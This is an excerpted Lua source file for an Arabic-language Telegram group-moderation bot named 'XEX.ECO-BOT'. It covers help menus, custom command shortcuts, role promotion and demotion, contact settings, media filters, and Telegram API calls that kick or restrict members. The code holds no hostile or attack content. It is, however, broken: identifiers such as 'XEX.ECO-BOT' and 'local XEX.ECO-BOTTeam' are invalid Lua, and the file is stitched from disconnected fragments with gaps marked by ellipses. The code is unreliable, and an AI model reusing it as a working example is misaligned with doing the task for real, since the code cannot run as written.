┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉
☆︙الاعدادت
...
local Help = DevALS:get(XEX.ECO-BOT..'ALS:Help3')
local Text = [[
☆︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉
☆︙فحص البوت
...
local Help = DevALS:get(XEX.ECO-BOT..'ALS:Help4')
local Text = [[
☆︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉
☆︙تنزيل الكل
...
local Help = DevALS:get(XEX.ECO-BOT..'ALS:Help5')
local Text = [[
☆︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉
☆︙الكروبات
...
if tonumber(ALS) == tonumber(data.sender_user_id_) then
local Help = DevALS:get(XEX.ECO-BOT..'ALS:Help6')
local Text = [[
☆︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉
...
if text and DevALS:get(XEX.ECO-BOT.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = DevALS:get(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
if NewCmmd then
DevALS:del(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text)
DevALS:del(XEX.ECO-BOT.."Set:Cmd:Group:New"..msg.chat_id_)
DevALS:srem(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,text)
...
DevALS:del(XEX.ECO-BOT.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if text and text:match('^'..(DevALS:get(XEX.ECO-BOT..'ALS:NameBot') or "يوكا")..' ') then
data.message_.content_.text_ = data.message_.content_.text_:gsub('^'..(DevALS:get(XEX.ECO-BOT..'ALS:NameBot') or "يوكا")..' ','')
end
if data.message_.content_.text_ then
local NewCmmd = DevALS:get(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":"..data.message_.content_.text_)
if NewCmmd then
data.message_.content_.text_ = (NewCmmd or data.message_.content_.text_)
end
end
if text and DevALS:get(XEX.ECO-BOT.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New"..msg.chat_id_,text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ارسل الامر الجديد", 1, 'html')
DevALS:del(XEX.ECO-BOT.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
if text and DevALS:get(XEX.ECO-BOT.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = DevALS:get(XEX.ECO-BOT.."Set:Cmd:Group:New"..msg.chat_id_)
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":"..text,NewCmd)
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الامر", 1, 'html')
DevALS:del(XEX.ECO-BOT.."Set:Cmd:Group1"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
if Constructor(msg) then
if text == "الاوامر المضافه" and ChCheck(msg) then
local List = DevALS:smembers(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_.."") 
t = "☆︙قائمة الاوامر المضافه ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
Cmds = DevALS:get(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..k.."~ ("..v..") • {"..Cmds.."}\n"
else
t = t..k.."~ ("..v..") \n"
...
local List = DevALS:smembers(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(List) do
DevALS:del(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
DevALS:del(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_)
end
...
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"ا")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"م")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"اد")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"مد")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"من")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"اس")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"تك")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevALS:sadd(XEX.ECO-BOT.."List:Cmd:Group:New"..msg.chat_id_,"#")
send(msg.chat_id_, msg.id_,"☆︙تم ترتيب الاوامر بالشكل التالي ~\n☆︙ ايدي - ا .\n☆︙ رفع مميز - م .\n☆︙رفع ادمن - اد .\n☆︙ رفع مدير - مد . \n☆︙ رفع منشى - من . \n☆︙ رفع منشئ الاساسي - اس  .\n☆︙ رفع مطور - مط .\n☆︙رفع مطور ثانوي - ثانوي .\n☆︙ تنزيل الكل - تك .\n☆︙ تعطيل الايدي بالصوره - تعط .\n☆︙ تفعيل الايدي بالصوره - تفع .\n☆︙ الرابط - ر .\n☆︙ ردود المدير - رر .\n☆︙ مسح المكتومين - ،، .\n☆︙ اضف رد - رد .\n☆︙ مسح سحكاتي - سح .\n☆︙ مسح رسائلي - رس .\n☆︙ غنيلي - غ .\n☆︙مسح قائمه العام")  
end
if text == "اضف امر" and ChCheck(msg) or text == "اضافة امر" and ChCheck(msg) or text == "اضافه امر" and ChCheck(msg) then
DevALS:set(XEX.ECO-BOT.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
DevALS:set(XEX.ECO-BOT.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
...
local List = DevALS:smembers(XEX.ECO-BOT.."Coomds"..msg.chat_id_)
if #List == 0 then
...
for k,v in pairs(List) do
var = DevALS:get(XEX.ECO-BOT.."Comd:New:rt:ALS:"..v..msg.chat_id_)
if var then
t = t..k.."~ "..v.." • ("..var..")\n"
else
t = t..k.."~ "..v.."\n"
...
local List = DevALS:smembers(XEX.ECO-BOT.."Coomds"..msg.chat_id_)
for k,v in pairs(List) do
DevALS:del(XEX.ECO-BOT.."Comd:New:rt:ALS:"..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT.."Coomds"..msg.chat_id_)
end
...
DevALS:set(XEX.ECO-BOT.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew)  
DevALS:sadd(XEX.ECO-BOT.."Coomds"..msg.chat_id_,ComdNew)  
DevALS:setex(XEX.ECO-BOT.."Comd:New"..msg.chat_id_..msg.sender_user_id_,200,true)  
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙ارسل نوع الصلاحيه \n{ عضو • مميز  • ادمن  • مدير }\n☆︙ارسل الغاء لالغاء الامر ", 1, 'html')
end
if text and text:match("^حذف صلاحيه (.*)$") and ChCheck(msg) or text and text:match("^مسح صلاحيه (.*)$") and ChCheck(msg) then 
ComdNew = text:match("^حذف صلاحيه (.*)$") or text:match("^مسح صلاحيه (.*)$")
DevALS:del(XEX.ECO-BOT.."Comd:New:rt:ALS:"..ComdNew..msg.chat_id_)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حذف الصلاحيه", 1, 'html')
end
if DevALS:get(XEX.ECO-BOT.."Comd:New"..msg.chat_id_..msg.sender_user_id_) then 
if text and text:match("^↫ الغاء ☆$") then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء الامر", 1, 'html')
DevALS:del(XEX.ECO-BOT.."Comd:New"..msg.chat_id_..msg.sender_user_id_) 
return false  
end 
if text == "مدير" then
...
local textn = DevALS:get(XEX.ECO-BOT.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_)  
DevALS:set(XEX.ECO-BOT.."Comd:New:rt:ALS:"..textn..msg.chat_id_,text)
...
if DevALS:sismember(XEX.ECO-BOT.."Coomds"..msg.chat_id_,DEV_ALS) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrALS = DevALS:get(XEX.ECO-BOT.."Comd:New:rt:ALS:"..DEV_ALS..msg.chat_id_)
...
DevALS:set(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ALS) 
DevALS:sadd(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_, result.sender_user_id_)
elseif mrALS == "ادمن" and Admin(msg) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'AAAVAA')..')'..' ❩\n☆︙تم رفعه ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
DevALS:set(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ALS)
DevALS:sadd(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, result.sender_user_id_)
elseif mrALS == "مدير" and Manager(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'AAAVAA')..')'..' ❩\n☆︙تم رفعه ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
DevALS:set(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_ALS)  
DevALS:sadd(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_, result.sender_user_id_)
...
DevALS:srem(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrALS == "ادمن" and Admin(msg) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'AAAVAA')..')'..' ❩\n☆︙تم تنزيله ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
DevALS:srem(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, result.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrALS == "مدير" and Manager(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'AAAVAA')..')'..' ❩\n☆︙تم تنزيله ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
DevALS:srem(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_, result.sender_user_id_)
DevALS:del(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrALS == "عضو" then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'AAAVAA')..')'..' ❩\n☆︙تم تنزيله ❨ '..DEV_ALS..' ❩ بنجاح', 1, 'md')
end
...
if DevALS:sismember(XEX.ECO-BOT.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrALS = DevALS:get(XEX.ECO-BOT.."Comd:New:rt:ALS:"..text1[2]..msg.chat_id_)
if mrALS == "مميز" and VipMem(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'AAAVAA')..')'..' ❩\n☆︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:sadd(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_, result.id_)
DevALS:set(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrALS == "ادمن" and Admin(msg) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'AAAVAA')..')'..' ❩\n☆︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:sadd(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, result.id_)
DevALS:set(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrALS == "مدير" and Manager(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'AAAVAA')..')'..' ❩\n☆︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:sadd(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_, result.id_)
DevALS:set(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrALS == "عضو" then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'AAAVAA')..')'..' ❩\n☆︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevALS:srem(XEX.ECO-BOT..'ALS:VipMem:'..msg.chat_id_, result.id_)
DevALS:del(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrALS == "ادمن" and Admin(msg) then 
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'AAAVAA')..')'..' ❩\n☆︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:srem(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, result.id_)
DevALS:del(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrALS == "مدير" and Manager(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'AAAVAA')..')'..' ❩\n☆︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevALS:srem(XEX.ECO-BOT..'ALS:Managers:'..msg.chat_id_, result.id_)
DevALS:del(XEX.ECO-BOT.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrALS == "عضو" then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'AAAVAA')..')'..' ❩\n☆︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevALS:incr(XEX.ECO-BOT..'ALS:UsersMsgs'..XEX.ECO-BOT..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevALS:incr(XEX.ECO-BOT..'ALS:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevALS:incr(XEX.ECO-BOT..'ALS:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevALS:sismember(XEX.ECO-BOT.."ALS:Users",msg.chat_id_) then
DevALS:sadd(XEX.ECO-BOT.."ALS:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Start:Time'..msg.sender_user_id_) then
tdcli_function({ID="GetUser",user_id_=DevId},function(arg,dp)
tdcli_function({ID="GetUser",user_id_=XEX.ECO-BOT},function(arg,dpbot)
local inline = {
...
local start = DevALS:get(XEX.ECO-BOT.."ALS:Start:Bot")
if start then 
Start_Source = start
else
...
DevALS:setex(XEX.ECO-BOT..'ALS:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source XEX.ECO-BOT     --
if not SecondSudo(msg) and not DevALS:sismember(XEX.ECO-BOT..'ALS:Ban:Pv',msg.sender_user_id_) and not DevALS:get(XEX.ECO-BOT..'ALS:Texting:Pv') then
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '☆︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n☆︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevALS:srem(XEX.ECO-BOT..'ALS:Ban:Pv',data.id_)  
return false  
end 
...
--     Source XEX.ECO-BOT     --
if text and DevALS:get(XEX.ECO-BOT..'ALS:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:Start:Bots'..msg.sender_user_id_) 
return false
end
DevALS:set(XEX.ECO-BOT.."ALS:Start:Bot",text)  
...
DevALS:set(XEX.ECO-BOT..'ALS:Start:Bots'..msg.sender_user_id_,true) 
...
DevALS:del(XEX.ECO-BOT..'Start:Bot') 
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل التواصل بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ☆' and ChCheck(msg) then  
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل التواصل بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Texting:Pv',true) 
end
if Sudo(msg) then
...
DevALS:del(XEX.ECO-BOT.."ALS:Lock:AutoFile")
end
...
DevALS:set(XEX.ECO-BOT.."ALS:Lock:AutoFile",true) 
end
end
end
--     Source XEX.ECO-BOT     --
...
local XEX.ECO-BOTTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_ALS(msg.chat_id_, msg.id_, 1, ''..XEX.ECO-BOTTeam[math.random(#XEX.ECO-BOTTeam)]..'' , 1, 'md')  
return false
end
--     Source XEX.ECO-BOT     --
...
local DevText = DevALS:get(XEX.ECO-BOT.."DevText")
if DevALS:get(XEX.ECO-BOT.."ALS:ChId") then DevCh = '\n☆︙*Dev Ch* ↬ [@'..DevCh1..']' else DevCh = '' end
if DevText then
...
local my_ph = DevALS:get(XEX.ECO-BOT.."ALS:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
*☆︙قائمه الالعاب المتطوره اضغط للعب*
]]
keyboard = {} 
...
{{text = '☆ TeAm XEX.ECO-BOT .', url="t.me/AAAVAA"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
ChatLeave(dp.id_, XEX.ECO-BOT)
DevALS:srem(XEX.ECO-BOT.."ALS:Groups", dp.id_)
else
...
DevALS:incr(XEX.ECO-BOT..'ALS:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevALS:get(XEX.ECO-BOT.."ALS:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
DevALS:sadd(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
...
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(XEX.ECO-BOT) then 
DevALS:srem(XEX.ECO-BOT.."ALS:Groups", msg.chat_id_) 
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevALS:incr(XEX.ECO-BOT..'ALS:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevALS:incr(XEX.ECO-BOT..'ALS:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source XEX.ECO-BOT     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevALS:get(XEX.ECO-BOT..'ALS:Lock:FreeBot'..XEX.ECO-BOT) then
if ChatType == 'pv' then
...
for i=0 , #admins do
if ALS.members_[i].bot_info_ == false and ALS.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevALS:sadd(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevALS:srem(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevALS:sadd(XEX.ECO-BOT..'ALS:Admins:'..msg.chat_id_, admins[i].user_id_)
...
if ALS.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevALS:sadd(XEX.ECO-BOT.."ALS:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevALS:sadd(XEX.ECO-BOT.."ALS:ALSConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevALS:srem(XEX.ECO-BOT.."ALS:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevALS:srem(XEX.ECO-BOT.."ALS:ALSConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevALS:sismember(XEX.ECO-BOT..'ALS:Groups',msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevALS:get(XEX.ECO-BOT..'ALS:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙عدد اعضاء المجموعه اقل من ↫ *'..(DevALS:get(XEX.ECO-BOT..'ALS:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","☆︙تم تفعيل المجموعه "..dp.title_)  
DevALS:sadd(XEX.ECO-BOT.."ALS:Groups",msg.chat_id_)
DevALS:sadd(XEX.ECO-BOT..'ALS:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
DevALS:set(XEX.ECO-BOT.."ALS:Groups:Links"..msg.chat_id_,LinkGroup) 
...
DevALS:set(XEX.ECO-BOT..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source XEX.ECO-BOT     --
local ReFalse = tostring(msg.chat_id_)
if not DevALS:sismember(XEX.ECO-BOT.."ALS:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
...
if DevALS:get(XEX.ECO-BOT..'ALS:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevALS:sadd(XEX.ECO-BOT..'ALS:Tkeed:'..msg.chat_id_, dp.id_)
...
if DevALS:get(XEX.ECO-BOT.."ALS:Lock:Join"..msg.chat_id_) then
...
if not Bot(msg) then 
local filter = DevALS:smembers(XEX.ECO-BOT.."ALS:FilterPhoto"..msg.chat_id_)
...
if not Bot(msg) then 
local filter = DevALS:smembers(XEX.ECO-BOT.."ALS:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Bot(msg) then 
local filter = DevALS:smembers(XEX.ECO-BOT.."ALS:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
local DelGpRedRedods = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_ALS(msg.chat_id_, msg.id_, 1,'☆︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevALS:del(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevALS:srem(XEX.ECO-BOT..'ALS:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
